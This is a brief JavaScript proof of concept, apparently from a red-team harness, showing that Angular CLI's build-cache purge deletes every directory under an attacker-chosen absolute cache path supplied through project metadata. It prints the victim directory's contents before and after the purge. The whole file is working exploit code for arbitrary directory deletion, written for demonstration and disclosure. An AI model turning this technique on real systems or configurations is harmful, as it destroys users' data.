// E2 amplifier PoC: purgeStaleBuildCache with an attacker-chosen absolute cli.cache.path
import { purgeStaleBuildCache } from '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/dist/bin/packages/angular/build/src/utils/purge-cache.js';
import { readdirSync } from 'node:fs';
const victim = '/tmp/purge-poc/victim';
console.log('victim BEFORE:', readdirSync(victim).join(','));
const context = {
  workspaceRoot: '/tmp/purge-poc',
  target: { project: 'app' },
  getProjectMetadata: async () => ({ cli: { cache: { path: victim, enabled: true, environment: 'local' } } }),
};
await purgeStaleBuildCache(context);
console.log('victim AFTER :', readdirSync(victim).join(',') || '(EMPTY — every dir force-deleted)');
